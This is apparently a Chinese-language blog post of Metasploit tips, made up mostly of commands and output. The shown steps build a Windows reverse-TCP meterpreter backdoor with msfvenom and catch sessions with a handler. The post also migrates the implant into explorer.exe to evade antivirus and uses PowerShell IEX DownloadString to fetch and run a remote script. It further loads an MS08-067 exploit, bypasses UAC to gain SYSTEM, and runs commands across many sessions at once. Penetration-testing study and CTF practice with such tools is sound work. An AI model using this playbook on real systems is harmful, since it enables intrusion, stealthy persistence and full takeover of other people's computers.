---
layout: post
title: Metasploit 平常『习惯』的养成
comments: false
description: ""
keywords: "Tricks"
---

Metasploit 中一些亟需养成为习惯的操作，碰到就记，慢慢更新；

## 1、msfvenom 生成后门

注意：端口尽量使用 `4444`，因为handler模块监听的所有payload【或者不夸张地说MSF中所有payload】监听&开放端口都为4444，这样可以省去之后很多端口设置；

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.43.100 LPORT=4444 -f exe > ~/Desktop/shell.exe 
```

## 2、handler 模块

注意：`set ExitOnSession false` 和 `exploit -j -z`；

```
msfconsole
msf > use exploit/multi/handler
msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 192.168.43.100
LHOST => 192.168.43.100
msf exploit(handler) > set ExitOnSession false
ExitOnSession => false
msf exploit(handler) > set LPORT 4444
LPORT => 4444

运行这两条命令后，4444端口会一直在后台处于侦听状态，来一个要一个；
msf exploit(handler) > set ExitOnSession false
ExitOnSession => false
msf exploit(handler) > exploit -j -z
[*] Exploit running as background job 0.

[*] Started reverse TCP handler on 192.168.43.100:4444 
msf exploit(handler) > 
[*] Sending stage (179267 bytes) to 192.168.43.103
[*] Meterpreter session 1 opened (192.168.43.100:4444 -> 192.168.43.103:49295) at 2018-01-12 16:20:37 +0800

msf exploit(handler) > 
[*] Sending stage (179267 bytes) to 192.168.43.103
[*] Meterpreter session 2 opened (192.168.43.100:4444 -> 192.168.43.103:49296) at 2018-01-12 16:20:42 +0800
```

## 3、Meterpreter Session

注意：

在Meterpreter Shell中退出session使用 `exit`；

在模块界面删除session使用 `session -k sessionID`；

而退到后台是使用 `background`；

```
meterpreter > exit
[*] Shutting down Meterpreter...
[*] 192.168.43.103 - Meterpreter session 1 closed.  Reason: User exit
[*] 192.168.43.103 - Meterpreter session 1 closed.  Reason: Died

msf exploit(handler) > sessions -k 2
[*] Killing the following session(s): 2
[*] Killing session 2
[*] 192.168.43.103 - Meterpreter session 2 closed.
```

## 4、migrate 进程注入

接收到 meterpreter 之后就应该将自己的进程迁移到一个隐蔽的进程中去，防止被查杀，直接在meterpreter中使用`migrate PID`；

```
meterpreter > getuid
Server username: Go0s-PC\Go0s
meterpreter > getpid
Current pid: 1784
meterpreter > ps

Process List
============
 PID   PPID  Name                       Arch  Session  User          Path
 ---   ----  ----                       ----  -------  ----          ----
 1784  3016  shell.exe                  x86   2        Go0s-PC\Go0s  C:\Users\Go0s\Desktop\shell.exe
 3016  1124  explorer.exe               x64   2        Go0s-PC\Go0s  C:\Windows\explorer.exe

meterpreter > migrate 3016
[*] Migrating from 1784 to 3016...
[*] Migration completed successfully.
meterpreter > getpid
Current pid: 3016
```

## 5、IP&端口 设置格式

当模块或者payload，设置ip段：

```
msf > use auxiliary/scanner/portscan/tcp 
msf auxiliary(tcp) > show options 

Module options (auxiliary/scanner/portscan/tcp):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CONCURRENCY  10               yes       The number of concurrent ports to check per host
   DELAY        0                yes       The delay between connections, per thread, in milliseconds
   JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS                        yes       The target address range or CIDR identifier
   THREADS      1                yes       The number of concurrent threads
   TIMEOUT      1000             yes       The socket connect timeout in milliseconds

msf auxiliary(tcp) > set ports 22-25,80-85,1433,3306,3389,445
ports => 22-25,80-85,1433,3306,3389,445
msf auxiliary(tcp) > set rhosts 192.168.1.1/24
rhosts => 192.168.1.1/24
msf auxiliary(tcp) > set threads 20
threads => 20
msf auxiliary(tcp) > exploit 

[+] 192.168.1.1:          - 192.168.1.1:80 - TCP OPEN
```

可以看出参数设置可以使用 `192.168.1.1/24` 子网掩码形式和 `22-25,80-85,1433,3306,3389,445` 连接符形式，逗号分隔；

## 6、Powershell

方式一：先进入`powershell`界面，再下载利用；

```
meterpreter > load powershell 
Loading extension powershell...Success.
meterpreter > powershell_shell 
PS > whoami
go0s-pc\go0s
PS > IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1");
PS > Invoke-Portscan -Hosts 192.168.1.104


Hostname      : 192.168.1.104
alive         : True
openPorts     : {49152}
closedPorts   : {80, 23, 443, 21...}
filteredPorts : {}
finishTime    : 2018/1/17 16:57:09
```

方式二：先下载，再进入`powershell`界面利用；

```
meterpreter > load powershell 
Loading extension powershell...Success.
meterpreter > run post/windows/manage/download_exec URL=https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1

[*] 41534 bytes downloaded to C:\Users\Go0s\AppData\Local\Temp\Invoke-Portscan.ps1 in 1 seconds 
meterpreter > powershell_shell
PS > C:\Users\Go0s\AppData\Local\Temp\Invoke-Portscan.ps1
PS > Invoke-Portscan -Hosts 192.168.1.104


Hostname      : 192.168.1.104
alive         : True
openPorts     : {49152}
closedPorts   : {80, 23, 443, 21...}
filteredPorts : {}
finishTime    : 2018/1/17 17:14:44
```

## 7、reload_all

当Github或者exploit等网站出现最新漏洞的MSF可利用脚本时，可以先自行导入利用；

msf模块目录可以使用`locate`找出来，将exp添加进去后要`reload_all`重新加载一下；

```
[Go0s]: ~ 
➜  locate windows/smb/ms08_067_netapi
/opt/metasploit-framework/embedded/framework/documentation/modules/exploit/windows/smb/ms08_067_netapi.md
/opt/metasploit-framework/embedded/framework/modules/exploits/windows/smb/ms08_067_netapi.rb
[Go0s]: ~/Download
➜  sudo mv ms08_067_netapi.rb /opt/metasploit-framework/embedded/framework/modules/exploits/windows/smb/ms08_067_netapi_cn.rb
在MSF中：
msf > reload_all 
```

## 8、bypassuac

获取meterpreter会话后进行提权前，习惯性的先执行一下bypass UAC；

```
msf exploit(multi/handler) > use exploit/windows/local/bypassuac
msf exploit(windows/local/bypassuac) > set session 1
session => 1
msf exploit(windows/local/bypassuac) > exploit
[*] Started reverse TCP handler on 192.168.43.100:4444
...
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

## 9、Sessions Command

可以获取任意shell后，来执行一些命令：

```
msf exploit(multi/handler) > sessions -h
Usage: sessions [options] or sessions [id]

Active session manipulation and interaction.

OPTIONS:

    -C <opt>  Run a Meterpreter Command on the session given with -i, or all
    -K        Terminate all sessions
    -S <opt>  Row search filter.
    -c <opt>  Run a command on the session given with -i, or all
    -h        Help banner
    -i <opt>  Interact with the supplied session ID
    -k <opt>  Terminate sessions by session ID and/or range
    -l        List all active sessions
    -n <opt>  Name or rename a session by ID
    -q        Quiet mode
    -r        Reset the ring buffer for the session given with -i, or all
    -s <opt>  Run a script or module on the session given with -i, or all
    -t <opt>  Set a response timeout (default: 15)
    -u <opt>  Upgrade a shell to a meterpreter session on many platforms
    -v        List sessions in verbose mode
    -x        Show extended information in the session table

Many options allow specifying session ranges using commas and dashes.
For example:  sessions -s checkvm -i 1,3-5  or  sessions -k 1-2,5,6
```

“-c 命令”：所有session执行同一命令，CTF中AWD下的新思路；

“-u ID”：给指定ID的session提升为meterpreter shell，即上传meterpreter的后门文件并监听执行；

“-s 脚本（vinenum）”：所有session执行同一脚本，如获取常见信息的vinenum脚本；

“-v”：显示会话详情；

“-n 名字 -i ID”：给指定ID的session命名；

“-k ID”：终止指定ID的session，-K 终止所有session；

